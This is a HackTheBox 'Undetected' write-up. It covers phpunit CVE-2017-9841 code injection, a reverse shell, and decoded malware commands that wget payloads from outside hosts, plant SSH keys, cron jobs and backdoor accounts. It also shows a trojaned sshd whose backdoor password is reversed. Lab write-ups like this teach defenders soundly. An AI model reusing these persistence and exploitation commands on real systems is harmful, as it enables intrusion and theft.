---
title: "Undetected"
date: 2022-09-20T15:03:31+01:00
draft: false
categories:
  - HackTheBox
---


## enumeration

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey:
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p+/GnN1jIsLs04V26rbPKLmMJLj7Dj/+yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU+Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ+mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh+eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=
|   256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O+xt4dDFvFQK

80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)

8081/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
```

```bash
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]
/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]
/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/]
/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
/index.php            (Status: 200) [Size: 6215]
/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]
/server-status        (Status: 403) [Size: 283]
/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
```


obviously we add the Ip to our known `hosts` as `djwelry.htb`
also there is a subdomain for the store so don't forget to add it too
There is a weird directory listing on port `8081` from the python server but not much
could not get any directory traversal
On the website, there is not much either

the `products.php` allow us to add products but when trying to access `cart.php` and `login.php` there is an error
We then visit the `/vendor` directory we found...looks like some composer installation
Let's check `phpunit`...and bingo! it's there and we can read it!

```php
if (version_compare('5.6.0', PHP_VERSION, '>')) {
    fwrite(
        STDERR,
        'This version of PHPUnit requires PHP 5.6; using the latest version of PHP is highly recommended.' . PHP_EOL
    );

    die(1);
}
```
Long story short: [CVE-2017-9841](https://www.cvedetails.com/cve/CVE-2017-9841/)

It's basically code injection, you can exploit it manually
You don't know how to do, you say?

Fret no more! vulnhub say "[I got you homie!](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md)"

Now monkey see monkey do (please its a joke and an expression...don't go BLM on me I am black IRL)

```bash
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 43510
/bin/sh: 0: can't access tty; job control turned off
$

```

Try to get the flag

Get immediately Reminded it's a medium box (not an "easy" one)

```bash
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ ls /home
<store/vendor/phpunit/phpunit/src/Util/PHP$ ls /home
steven
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ ls -al /home/steven
<r/phpunit/phpunit/src/Util/PHP$ ls -al /home/steven
ls: cannot open directory '/home/steven': Permission denied
```

Enumeration amirite? it's usually the `php.config` files

But not this time...well...I tried to look around and I think I got stuck
`linpeas.sh` upload it is! (I just ran one someone uploaded in /tmp XD )
Don't think it made it easier, you still have to filter out what cannot be used
Took some time but I got this

```bash
...

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
uniq: write error: Broken pipe
/dev/mqueue
/dev/shm
/dev/shm/pspy64
/run/lock
/run/lock/apache2
/run/screen
/run/screen/S-www-data
/tmp
/tmp/linpeas.sh
/tmp/tmux-33
/var/backups/info
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp
/var/tmp/ResourceOperations.php.swp
/var/tmp/login.php.swp
/var/tmp/products.php.swp
/var/www/main

...

```

`/var/backups/info` is the one standing out so lets see..It's an ELF binary

I try to run it

```bash
www-data@production:/tmp$ /var/backups/info
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[-] substring 'Freeing SMP' not found in dmesg
```

Uhh..okay Strings is not available so I just used 'cat' on a binary (heresy!)

I got something in all the gibberish

```bash
sockopt(PACKET_VERSION)[-] setsockopt(PACKET_RX_RING)[-] socket(AF_PACKET)lo[-] bind(AF_PACKET)[-] sendto(SOCK_RAW)[-] socket(SOCK_RAW)[-] socket(SOCK_DGRAM)[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)[-] klogctl(SYSLOG_ACTION_READ_ALL)Freeing SMP[-] substring '%s' not found in dmesg
ffff/bin/bash-c776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b[-] fork()/etc/shadow[.] checking if we got root[-] something went wrong =([+] got r00t ^_^[-] unshare(CLONE_NEWUSER)deny/proc/self/setgroups[-] write_file(/proc/self/set_groups)0 %d 1
/proc/self/uid_map[-] write_file(/proc/self/uid_map)/proc/self/gid_map[-] write_file(/proc/self/gid_map)[-] sched_setaffinity()/sbin/ifconfig lo up[-] system(/sbin/ifconfig lo up)[.] starting[.] namespace sandbox set up[.] KASLR bypass enabled, getting kernel addr[.] done, kernel text:   %lx
[.] commit_creds:        %lx
[.] prepare_kernel_cred: %lx
[.] native_write_cr4:    %lx
```

Its hex... decode it to ASCII
I made a little mistake there you can avoid: Do not include the 'c' in 'bash-c'
Its understandable because c is a hex character BUT here the script try to execute the encoded command
the `-c` is used to execute bash commands from strings (read the manual...duh)

Anyway, take everything that comes after `bash-c` ( and before `[-]` obviously )
Decode it how you want and get this:

```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```
Yeah its better now! The script setup a password for a new user in /etc/passwd

we got a hash!
Reformat it! just remove the escape characters
Looks like `SHA-512crypt` (google $6$ hash and check hashcat examples)

```text
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
```
Fire up the cat in mode `1800`

```bash
└──╼ $hashcat -m 1800 '$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/' /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers

...
```

So the creds are : `steven1:ihatehackers`
yup the script adds `1` to `$user` before adding it to `/etc/passwd`
I hope I can ssh with those
Yup! we get the flag now

```bash
steven@production:~$ ls -al
total 40
drwxr-x--- 6 steven steven 4096 Feb 26 22:57 .
drwxr-xr-x 3 root   root   4096 Feb  8 19:59 ..
lrwxrwxrwx 1 steven steven    9 Jul  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 steven steven  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 steven steven 3771 Feb 25  2020 .bashrc
drwx------ 2 steven steven 4096 Feb  8 19:59 .cache
drwx------ 3 steven steven 4096 Feb 26 22:57 .gnupg
drwxrwxr-x 3 steven steven 4096 Feb  8 19:59 .local
-rw-r--r-- 1 steven steven  807 Feb 25  2020 .profile
drwx------ 2 steven steven 4096 Feb  8 19:59 .ssh
-rw-r----- 1 root   steven   33 Feb 26 22:44 user.txt
steven@production:~$ cat user.txt
undetected_user_flag
```

## Privilege escalation

Steven might reuse his password for sudo you say?

```bash
steven@production:~$ sudo -l
[sudo] password for steven:
Sorry, try again.
```

Another quick reminder of this box level

SUID gave us nothing useful too

well...linpeas again (damn...twice!)

```bash
...

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)
    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/mail/steven
    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/spool/mail/steven

...

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/dev/shm/linpeas.sh
/home/steven
...
/var/crash
/var/lib/php/sessions
/var/mail/steven
/var/tmp

...
```

Ok the mails are important!

```bash
steven@production:/var/mail$ cat steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```
Ah yes...Mark...who tf is Mark?
Lol let's just check the Apache installation in `/usr/lib/apache2`
We have access to the modules
They said there was a recent update...what changed recently?

```bash
steven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u
 2050 -rw-r--r-- 1 root root   34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so
 5093 -rw-r--r-- 1 root root 4625776 2021-11-25 23:16:22.000000000 +0000 libphp7.4.so
 7990 -rw-r--r-- 1 root root   15925 2022-01-05 14:49:56.000000000 +0000 httpd.exp
 7997 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_access_compat.so
...
```

Latest changes are on `mod_reader.so`

I 'cat' this again (ohh lord forgive me)

```bash
eblockstrncat__stack_chk_failb64_decodeb64strchrforkpidexecvereader_modulelibc.so.6mod_reader.soGLIBC_2.2.5GLIBC_2.4�u▒i      �ii
                                                                                         reader/bin/bash-cmod_reader.cd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hkD`

```

In all the weird stuff I got a base64 string (reference + length)

```text
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
```
Easily decoded!

```bash
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```
uhm...okay there is a pro stuff going on here
This module downloads a weird "picture" and outputs it as `/usr/sbin/sshd`
looks like a suspicious move! let's analyse the sshd file
Let's get that file and try to Reverse engineer this (Damn I hate this part)

```bash
└──╼ $scp steven1@10.10.11.146:/usr/sbin/sshd .
steven1@10.10.11.146's password:
sshd
```

Let's open it with Cutter
There is an interesting `auth_password` function
Nice backdoor they got there!

```bash
 ;-- auth_password:
dbg.auth_password (int64_t arg1, int64_t arg2, int64_t arg7);
; var char[31] backdoor @ rbp-0x50
; var int64_t var_10h_2 @ rsp-0x48
; var int64_t var_18h_2 @ rsp-0x40
; var int64_t var_1ch @ rsp-0x3c
; var int64_t var_1eh @ rsp-0x3a
; var int64_t var_7h @ rsp-0x39
; var int64_t var_10h @ rsp-0x30
; arg int64_t arg1 @ rdi
; arg int64_t arg2 @ rsi
; arg int64_t arg7 @ xmm0
0x00010650      endbr64            ; auth-passwd.c:78 ; int auth_password(ssh * ssh,char const * password);
0x00010654      push r14
0x00010656      mov r14, rsi       ; arg2
0x00010659      mov esi, 0xffffa9f4 ; auth-passwd.c:86
0x0001065e      mov edx, 0xffffffd6 ; 4294967254
0x00010663      push r13           ; auth-passwd.c:78
0x00010665      push r12
0x00010667      push rbp
0x00010668      mov rbp, rdi       ; arg1
0x0001066b      push rbx
0x0001066c      sub rsp, 0x30
0x00010670      mov rbx, qword [rdi + 0x860] ; auth-passwd.c:79 ; arg1
0x00010677      movdqa xmm0, xmmword [0x0007db30] ; auth-passwd.c:86
0x0001067f      mov rax, qword fs:[0x28] ; auth-passwd.c:78
0x00010688      mov qword [var_10h], rax
0x0001068d      xor eax, eax
0x0001068f      mov word [var_1ch], si ; auth-passwd.c:79
0x00010694      mov rsi, rsp
0x00010697      lea rcx, [var_7h]
0x0001069c      mov r13, qword [rbx + 0x30] ; auth-passwd.c:80
0x000106a0      mov r12d, dword [rbx + 0xc] ; auth-passwd.c:81
0x000106a4      mov dword [var_18h_2], 0xbcf0b5e3 ; auth-passwd.c:83
0x000106ac      movabs rax, 0xb2d6f4a0fda0b3d6
0x000106b6      mov qword [var_10h_2], rax
0x000106bb      mov rax, rsi
0x000106be      mov byte [var_1eh], 0xa5
0x000106c3      movaps xmmword [rsp], xmm0 ; auth-passwd.c:86 ; arg7
...
```

Ok the difficulty just went to insane real quick
I checked the forums, discord and stuff and I can still feel my brain melting
I am no expert in Reverse engineering but damn...I need to learn it ASAP
Ok I did not fully get everything but from the help I got:
the 'backdoor' variable password is 31 bits (got that)

I had to move to `Ghidra` to get a better `decompiler` output
The password ismade out of those chunks

```bash
  ...
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf0e7abd6;
  backdoor._12_4_ = 0xa4b3a3f3;
  ...
```

But the order is not right and the start should be `0xa5`

```asm
        001106bb 48 89 f0        MOV        RAX,password
        001106be c6 44 24        MOV        byte ptr [RSP + backdoor[30]],0xa5
                 1e a5
```
So we got these now!

```asm
0xa5
0xa9f4
0xbcf0b5e3
0xb2d6f4a0fda0b3d6
0xfdb3d6e7
0xf7bbfdc8
0xa4b3a3f3
0xf0e7abd6
```
then we do conversion to `hex` then `xor` with the key `96`

```asm
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
```
Well let cyberchef bake that for you

Just follow [this recipe](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg)

then we have the root password (from the backdoor)

```text
@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
```

Nice! even the final password is not human-friendly! XD

```bash
└──╼ $ssh root@10.10.11.146
root@10.10.11.146's password:
Last login: Tue Feb  8 20:11:45 2022 from 10.10.14.23
root@production:~# ls
root.txt
root@production:~# cat root.txt
undetected_root_flag
```
Damn hackthebox machines make me feel very ignorant!
This box took me alot of time and efforts and the RE part got me stuck for too long
Keep learning folks! Never stop learning!
